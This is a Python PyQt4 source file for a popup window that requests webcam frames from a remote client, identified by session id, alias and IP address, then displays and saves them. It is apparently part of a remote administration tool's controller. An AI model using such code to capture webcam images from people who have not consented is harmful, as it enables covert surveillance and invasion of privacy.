from PyQt4.QtGui import *
from PyQt4.QtCore import *

import main_ui

from libs.language import Translate

import ast
import zlib
from PIL import Image, ImageQt

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class mainPopup(QWidget, main_ui.Ui_Form):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.moderator = args['moderator']
        self.client = args['client']
        self.session_id = args['session_id']
        self.module_id = args['module_id']
        self.alias = args['alias']
        self.ip_address = args['ip_address']

        title_prefix = self.alias if len(self.alias) > 0 else self.ip_address

        self.setWindowTitle(u'[{}] {}'.format(title_prefix, _('MWEBCAM_TITLE')))

        self.saveButton.setDisabled(True)
        self.clearButton.setDisabled(True)

        self.cameraButton.clicked.connect(self.get_screenshot)
        self.saveButton.clicked.connect(self.save_preview)
        self.clearButton.clicked.connect(self.clear_preview)
        self.alwaysTopButton.clicked.connect(self.always_top)

    def signal(self, data):
        self.callback(data)

    def get_screenshot(self):
        self.moderator.send_msg('getWebcam', 'getWebcam', session_id=self.session_id, _to=self.client, module_id=self.module_id)
        self.callback = self.recv_screenshot

    def recv_screenshot(self, data):
        webcam_dict = data['payload']
        try:
            camera_info = ast.literal_eval(webcam_dict)
            im = Image.frombytes('RGB', (int(camera_info['width']), int(camera_info['height'])),
                                      zlib.decompress(camera_info['webcambits']), 'raw', 'BGR', 0, -1)
            camera_bits = im.convert('RGBA')
            self.cameraLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(camera_bits)).scaled(
                    self.cameraLabel.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation))
            self.current_bits = camera_bits
            self.saveButton.setDisabled(False)
            self.clearButton.setDisabled(False)
        except SyntaxError:
            pass

    def save_preview(self):
        if self.current_bits:
            file_name = QFileDialog.getSaveFileName(self, 'Save file', '', 'Image (*.png)')
            windows_path = str(file_name).replace('/', '\\')
            if file_name:
                self.current_bits.save(windows_path, 'png')
        else:
            self.saveButton.setDisabled(True)
            self.clearButton.setDisabled(True)

    def clear_preview(self):
        self.current_bits = None
        self.cameraLabel.clear()
        self.saveButton.setDisabled(True)
        self.clearButton.setDisabled(True)

    def resizeEvent(self, event):
        if self.cameraLabel.pixmap():
            self.cameraLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(self.current_bits)).scaled(
                self.cameraLabel.width(), self.cameraLabel.height(), Qt.KeepAspectRatio, Qt.SmoothTransformation))

    def always_top(self):
        if self.alwaysTopButton.isChecked():
            self.setWindowFlags(self.windowFlags() | Qt.WindowStaysOnTopHint)
            self.show()
        else:
            self.setWindowFlags(self.windowFlags() & ~Qt.WindowStaysOnTopHint)
            self.show()

